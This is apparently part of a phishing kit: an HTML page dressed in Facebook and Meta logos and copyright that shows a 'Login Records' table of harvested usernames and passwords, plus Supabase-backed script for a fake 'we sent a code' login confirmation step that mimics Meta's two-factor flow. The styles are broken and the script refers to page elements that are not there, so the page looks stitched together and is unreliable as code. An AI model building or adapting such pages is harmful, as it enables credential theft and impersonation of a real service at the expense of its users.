<head>
  <meta charset="UTF-8" />

  <style>
    body {
      background-color: #f0f2f5;

      margin: 0;
      display: flex;
      flex-direction: column;

    .confirmation-container {
      background: white;
      max-width: 400px;

    }
    .fb-logo {

    .fb-logo img {
      height: 40px;
    }
    h2 {
      color: #1c1e21;
      font-size: 20px;
      margin-bottom: 10px;
    }
    p {
      color: #606770;
      font-size: 14px;
      margin-bottom: 25px;
      line-height: 1.4;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 10px;
      border-bottom: 1px solid #ccc;
      text-align: left;
    }
    th {
      background-color: #1877f2;
      color: white;
    }
    .meta-footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: white;
      padding: 10px 20px;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);

    }
    .top-line {
      display: flex;

      gap: 8px;

      height: 24px;
    }

      font-weight: bold;
      font-size: 1.1rem;
      color: #333;
    }

      font-size: 0.9rem;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="confirmation-container">
    <div class="fb-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
    </div>
    <h2>Login Records</h2>
    <p>Live view of usernames and passwords submitted.</p>

    <table>
      <thead>
        <tr>
          <th>Username</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody id="logins-table-body">
        <!-- Dynamic rows -->
      </tbody>
    </table>
  </div>

  <div class="meta-footer">
    <div class="top-line">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta logo" />
      <div class="meta-text">Meta</div>
    </div>
    <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 <script>
  // Supabase setup
  const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'; // use your full anon key
  const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

  window.onload = function () {
    const user = localStorage.getItem("login_user");
    const msgEl = document.getElementById("confirmation-msg");

    if (!user) {
      msgEl.textContent =
        "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
      return;
    }

    let displayType = "account";
    let ending = "";

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (emailRegex.test(user)) {
      displayType = "email";
      const atIndex = user.indexOf("@");
      ending = user.slice(atIndex);
    } else if (/^\d{7,}$/.test(user)) {
      displayType = "phone number";
      ending = user.slice(-4);
    } else {
      displayType = "username";
      ending = user.length > 4 ? user.slice(-4) : user;
    }

    msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
  };

  async function verifyCode() {
    const codeInput = document.getElementById("code-input");
    const code = codeInput.value.trim();

    // Remove previous error state
    const existingError = document.querySelector(".error-message");
    if (existingError) existingError.remove();
    codeInput.style.borderColor = "#ccc";

    if (!code) {
      codeInput.style.borderColor = "red";

      const error = document.createElement("div");
      error.className = "error-message";
      error.textContent = "Required";
      error.style.color = "red";
      error.style.fontSize = "12px";
      error.style.marginTop = "-15px";
      error.style.marginBottom = "15px";
      codeInput.parentNode.insertBefore(error, codeInput.nextSibling);

      return;
    }

    try {
      const { data, error } = await supabase
        .from("codes") // table name
        .select("*")
        .eq("code", code) // column name
        .single();

      if (error || !data) {
        alert("Incorrect code. Please try again.");
      } else {
        window.location.href = "homepage.html";
      }
    } catch (err) {
      alert("An error occurred. Please try again.");
    }
  }
</script>

</body>
</html>
